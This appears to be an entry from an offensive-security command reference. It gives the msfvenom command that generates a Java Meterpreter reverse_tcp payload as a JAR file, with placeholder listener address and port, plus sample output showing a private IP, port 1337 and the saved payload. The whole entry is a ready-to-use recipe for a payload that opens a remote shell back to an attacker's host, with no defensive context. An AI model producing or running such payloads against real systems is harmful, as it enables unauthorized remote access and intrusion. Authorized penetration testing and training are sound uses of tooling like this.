---
id: cc603bda-06b3-48f8-893b-95cd86816b58
name: msfvenom JAVA Meterpreter reverse shell
type: command
executor: null
data: msfvenom -p java/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f
  raw -o msf.jar
output: 'root@hackers:~# msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.162.187
  LPORT=1337 -f raw -o java.jar

  Payload size: 5309 bytes

  Saved as: java.jar

  '
created_at: '2019-09-17T17:35:37.338602+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[msfvenom]]'
---

# msfvenom JAVA Meterpreter reverse shell

```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o msf.jar
```

## Expected Output

```
root@hackers:~# msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.162.187 LPORT=1337 -f raw -o java.jar
Payload size: 5309 bytes
Saved as: java.jar

```


